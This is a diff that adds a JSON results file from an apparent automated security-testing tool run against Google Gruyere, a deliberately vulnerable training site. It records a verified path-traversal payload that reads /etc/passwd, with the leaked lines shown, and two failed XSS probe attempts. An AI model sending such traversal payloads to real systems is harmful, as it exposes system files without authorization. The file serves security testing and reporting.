@@ -1,0 +1,76 @@
+{
+ "layer": "sentinel-impact/4.4.0",
+ "target": "https://google-gruyere.appspot.com",
+ "run_id": "run-228ffb67c9",
+ "impacts": [
+  {
+   "path_id": "L3P-fcc292fc64",
+   "probe_kind": "traversal_file_read",
+   "findings": [
+    "F-4eac8c9136"
+   ],
+   "title": "traversal_file_read at /479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd (param ) — minimal benign proof",
+   "status": "VERIFIED",
+   "reason": "",
+   "detail": {
+    "file": "227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "shared_markers": [
+     "root:x:0:0:root:/root:/bin/sh",
+     "daemon:x:1:1:daemon:/usr/sbin:/bin/sh",
+     "bin:x:2:2:bin:/bin:/bin/sh",
+     "sys:x:3:3:sys:/dev:/bin/sh"
+    ]
+   },
+   "evidence": [
+    {
+     "kind": "probe",
+     "ref": "pr-0001",
+     "excerpt": "root:x:0:0:root:/root:/bin/sh"
+    }
+   ]
+  },
+  {
+   "path_id": "L3P-c01bc22425",
+   "probe_kind": "xss_stored_persistence",
+   "findings": [
+    "F-85f0251945"
+   ],
+   "title": "xss_stored_persistence at /479896317371227311345106373618080751617/saveprofile (param uid) — minimal benign proof",
+   "status": "PROBE_FAILED",
+   "reason": "the stored canary did not persist AND execute (measured below) — honest failure",
+   "detail": {
+    "resubmit_status": 200,
+    "fired": false,
+    "payload_rides_the_request": true,
+    "observed_flag": "",
+    "expected_flag": "l3stocanary"
+   },
+   "evidence": []
+  },
+  {
+   "path_id": "L3P-f96124c1eb",
+   "probe_kind": "xss_browser_execution",
+   "findings": [
+    "F-fada1dc319"
+   ],
+   "title": "xss_browser_execution at /479896317371227311345106373618080751617/snippets.gtl (param uid) — minimal benign proof",
+   "status": "PROBE_FAILED",
+   "reason": "the browser did not execute the planned canary (measured below) — honest failure, never a fake proof",
+   "detail": {
+    "fired": false,
+    "observed_flag": "",
+    "expected_flag": "l3canary"
+   },
+   "evidence": []
+  }
+ ],
+ "summary": {
+  "total": 3,
+  "verified": 1,
+  "inferred": 0,
+  "probe_failed": 2,
+  "not_safe": 0,
+  "refused": 0,
+  "honesty": "an impact is VERIFIED only via a confirming fresh live probe from this run; reasoned-only stays INFERRED; attempted-but-unconfirmed is PROBE_FAILED with the measured numbers. Capability proven, not exploited — أُثبتت القدرة، لم تُستغَل"
+ }
+}
